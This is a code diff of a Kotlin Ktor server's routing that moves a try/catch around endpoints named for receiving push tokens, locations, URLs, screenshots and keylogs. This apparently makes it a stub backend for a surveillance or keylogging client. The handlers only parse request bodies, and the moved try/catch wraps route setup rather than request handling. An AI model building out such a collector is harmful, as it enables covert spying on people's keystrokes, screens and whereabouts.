@@ -15,34 +15,34 @@ import io.ktor.server.request.*
 fun Application.configureRouting() {
 
     routing {
-        get("/sendpushtoken") {
-            try {
+        try {
+            get("/sendpushtoken") {
                 val pushToken = call.receive<PushToken>()
             }
-            catch (e: Exception) {
-                printError(e.message.toString())
+
+            get("/sendlocation") {
+                val location = call.receive<Location>()
+            }
+
+            get("/sendurl") {
+                val url = call.receive<Url>()
+            }
+
+            get("/sendscreenshot") {
+                val screenshot = call.receive<Screenshot>()
+            }
+
+            get("/sendkeylog") {
+                val keyLog = call.receive<KeyLog>()
+            }
+
+            // Static plugin. Try to access `/static/index.html`
+            static("/static") {
+                resources("static")
             }
         }
-
-        get("/sendlocation") {
-            val location = call.receive<Location>()
-        }
-
-        get("/sendurl") {
-            val url = call.receive<Url>()
-        }
-
-        get("/sendscreenshot") {
-            val screenshot = call.receive<Screenshot>()
-        }
-
-        get("/sendkeylog") {
-            val keyLog = call.receive<KeyLog>()
-        }
-
-        // Static plugin. Try to access `/static/index.html`
-        static("/static") {
-            resources("static")
+        catch (e: Exception) {
+            printError(e.message.toString())
         }
     }
 
